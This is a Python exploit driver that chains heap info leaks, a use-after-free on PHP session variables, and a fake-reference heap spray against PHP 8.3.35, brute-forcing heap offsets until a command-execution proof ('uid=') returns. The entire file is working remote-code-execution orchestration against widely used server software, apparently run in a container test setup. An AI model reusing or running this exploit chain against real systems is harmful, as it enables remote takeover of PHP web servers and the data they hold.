#!/usr/bin/env python3
"""8.3.35: our stage1+2 leaks + 9bie A2 cheap-OOM + 9bie B2 spray, scanning S offset.

S = chunk_base + offset is the fake zend_array (ht field) address. The spray's
fake refs all point to S. Scan offset so S is correct for 8.3.35's heap layout.
"""
import subprocess, sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from p2s8335_lib import (log, PORT, CONTAINER, DTOR_OFFSET, ZIF_OFFSET,
                         stage1, stage2, rotate, restart, container_ok,
                         get_proof, CMD)
GH = r"C:\Users\likat\.qwen\tmp\p2s"
TMP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp_8335")

def run9(script, args, timeout=180):
    cmd = [sys.executable, os.path.join(GH, f"gh_pure_{script}")] + args
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return (r.stdout or "") + (r.stderr or "")

def main():
    os.makedirs(TMP, exist_ok=True)
    restart()
    log("[*] stage1...")
    chunk = stage1(PORT)
    if not chunk: log("[-] stage1 failed"); return 1
    log(f"[+] chunk=0x{chunk:x}")
    log("[*] stage2...")
    libphp = stage2(PORT)
    if not libphp: log("[-] stage2 failed"); return 1
    log(f"[+] libphp=0x{libphp:x}")
    zif = libphp + ZIF_OFFSET

    # S offsets to scan (8.4.26 value 0xF8398 + spread)
    offsets = [0xF8398]
    for d in range(-0x20000, 0x20001, 0x4000):
        offsets.append(0xF8398 + d)
    for o in range(0x1E000, 0x140001, 0x4000):
        if o not in offsets:
            offsets.append(o)
    offsets = sorted(set(offsets))
    log(f"[*] scanning {len(offsets)} S offsets")

    for off in offsets:
        if not container_ok(PORT):
            restart()
            chunk = stage1(PORT)
            if not chunk: continue
            libphp = stage2(PORT)
            if not libphp: continue
            zif = libphp + ZIF_OFFSET
        S = chunk + off
        ht_file = os.path.join(TMP, "ht_s.bin")
        o1 = run9("mk_ht.py", [hex(S), hex(zif), CMD, ht_file], timeout=30)
        if not os.path.exists(ht_file):
            log(f"  [!] mk_ht failed: {o1[-100:]}"); continue
        # A2 cheap OOM (dangling PS(http_session_vars))
        rotate(PORT)
        o2 = run9("cheap_oom_a.py", ["--port", str(PORT), "--parts", "880",
                                     "--depth", "64", "--fillers", "115"], timeout=120)
        time.sleep(0.3)
        # B2 spray
        o3 = run9("fake_ref_b.py", ["--port", str(PORT), "--vl", "384",
                                    "--n1", "500", "--n2", "495", "--rc", "1",
                                    "--ht-addr", hex(S), "--ht-file", ht_file],
                  timeout=120)
        time.sleep(0.8)
        status, body = get_proof(PORT)
        hit = (status == 200 and b"uid=" in body)
        log(f"  S_off=0x{off:05x} -> {'HIT' if hit else 'miss'} (http {status})")
        if hit:
            log(f"[+] RCE PROVEN! {body.decode('latin1').strip()}")
            log(f"[+] S_offset=0x{off:x}")
            return 0
        if not container_ok(PORT):
            log("  [!] worker died")
    log("[-] no S offset worked")
    return 1

if __name__ == "__main__":
    sys.exit(main())
